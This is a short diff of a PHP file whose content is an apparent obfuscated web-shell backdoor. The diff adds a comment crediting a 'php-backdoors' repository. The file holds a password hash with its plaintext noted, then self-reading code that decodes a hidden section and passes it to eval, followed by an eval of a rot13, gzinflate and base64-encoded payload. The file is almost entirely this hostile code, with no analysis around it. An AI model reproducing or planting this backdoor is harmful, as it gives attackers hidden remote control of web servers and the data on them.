@@ -1,4 +1,5 @@
 <?pHp
+// from https://github.com/1337r0j4n/php-backdoors
 $password = "21232f297a57a5a743894a0e4a801fc3"; // password : nullh4x0r
 $bn_d7624002cad982b3=array(base64_decode("L3gvaQ=="),base64_decode("eA=="),base64_decode(strrev(str_rot13(explode(base64_decode("Pz4="),file_get_contents(__FILE__))[1]))));preg_replace($bn_d7624002cad982b3[0],serialize(eval($bn_d7624002cad982b3[2])),$bn_d7624002cad982b3[1]); eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B'))))); exit();
 ?>
